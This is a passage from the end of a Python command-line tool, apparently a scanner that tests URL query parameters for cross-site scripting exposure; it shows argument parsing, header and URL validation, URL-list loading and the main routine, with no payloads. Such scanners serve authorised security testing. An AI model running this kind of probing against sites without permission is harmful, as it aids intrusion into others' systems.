                   help='Custom character-group definition file')
    p.add_argument('-p', '--proxy', metavar='URL',
                   help='HTTP proxy URL (e.g. http://127.0.0.1:8080)')
    p.add_argument('--delay', type=int, default=DEFAULT_DELAY, metavar='MS',
                   help='Delay between requests in ms; serialises requests when > 0 (default: 0)')
    p.add_argument('--retries', type=int, default=DEFAULT_RETRIES, metavar='N',
                   help=f'Max retries per failed request (default: {DEFAULT_RETRIES})')
    p.add_argument('-v', '--verbose', action='store_true',
                   help='Verbose logging and per-parameter analysis details')
    p.add_argument('-q', '--quiet', action='store_true',
                   help='Suppress banner and progress output')
    p.add_argument('--json', action='store_true', dest='json_output',
                   help='Write JSON output with full analysis details')
    p.add_argument('--no-color', action='store_true',
                   help='Disable colored output')
    p.add_argument('--skip-update-check', action='store_true',
                   help='Skip the automatic git update check')
    p.add_argument('-u', '--update', action='store_true',
                   help='Update to the latest version via git and exit')
    p.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')
    return p


def parse_headers(raw: Optional[List[str]]) -> Dict[str, str]:
    headers: Dict[str, str] = {}
    if not raw:
        return headers
    for h in raw:
        if ':' not in h:
            print(C(f"Invalid header (expected 'Key: Value'): {h}", Fore.RED))
            sys.exit(1)
        k, v = h.split(':', 1)
        headers[k.strip()] = v.strip()
    return headers


def validate_domain_url(url: str) -> str:
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        print(C("Error: URL must start with http:// or https://", Fore.RED))
        print(C("Example: https://example.com/page?param1=value", Fore.CYAN))
        sys.exit(1)
    parsed = urllib.parse.urlparse(url)
    if not parsed.query or not urllib.parse.parse_qs(parsed.query, keep_blank_values=True):
        print(C("Error: URL must contain at least one query parameter", Fore.RED))
        print(C("Example: https://example.com/page?param1=value&param2=test", Fore.CYAN))
        sys.exit(1)
    return url


def load_urls(args) -> Tuple[List[str], int]:
    if args.domain:
        url = validate_domain_url(args.domain)
        return [url], 0

    if args.url_list == '-':
        raw = sys.stdin.readlines()
    else:
        path = Path(args.url_list)
        if not path.is_file():
            print(C(f"Error: File not found: {args.url_list}", Fore.RED))
            sys.exit(1)
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            raw = f.readlines()

    urls, skipped = filter_urls(raw)
    if not urls:
        print(C("Error: No valid URLs with parameters found", Fore.RED))
        sys.exit(1)
    return urls, skipped


def main():
    global _color_enabled

    parser = build_parser()
    args = parser.parse_args()

    if args.no_color:
        _color_enabled = False
        colorama_init(strip=True)
    else:
        colorama_init(autoreset=True)

    warnings.filterwarnings('ignore', category=RuntimeWarning, module='asyncio')
    setup_logging(verbose=args.verbose)

    if args.update:
        print(C("Checking for updates...", Fore.CYAN))
        updater = AutoUpdater()
        result = updater.apply_update()
        if result['ok']:
            print(C(f"Version: {result.get('version', VERSION)} — {result['message']}", Fore.GREEN))
            if 'Updated' in result['message']:
                print(C("Restart the tool to use the new version.", Fore.YELLOW))
        else:
            print(C(f"Update failed: {result['message']}", Fore.RED))
            sys.exit(1)
        sys.exit(0)

    if not args.domain and not args.url_list:
        parser.print_help()
        print(f"\n{C('Error: -d/--domain or -l/--url-list is required', Fore.RED)}")
        sys.exit(2)

    headers = parse_headers(args.header)
    urls, skipped = load_urls(args)

    version_info: Dict[str, Any] = {'current': VERSION, 'update': None}
    if not args.skip_update_check:
        try:
            updater = AutoUpdater()
            version_info = updater.check()
        except Exception:
            pass

    analyzer = XSSParamAnalyzer(
        max_connections=args.connections,
        timeout=args.timeout,
        output_file=args.output,
        headers=headers,
        char_file=args.char_file,
        proxy=args.proxy,
        delay=args.delay,
        retries=args.retries,
        verbose=args.verbose,
        quiet=args.quiet,
    )

    analyzer.banner(version_info)

    if not args.quiet:
        print(C(f"Loaded {len(urls)} URL(s) with parameters", Fore.GREEN))
        if skipped:
            print(C(f"Skipped {skipped} URL(s) without parameters", Fore.YELLOW))
        print()

    asyncio.run(process_urls(analyzer, urls, json_output=args.json_output))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C('Interrupted.', Fore.YELLOW)}")
        sys.exit(130)
    except Exception as exc:
        logging.critical(f"Fatal: {exc}", exc_info=True)
        print(f"\n{C(f'Fatal error: {exc}', Fore.RED)}")
        sys.exit(1)
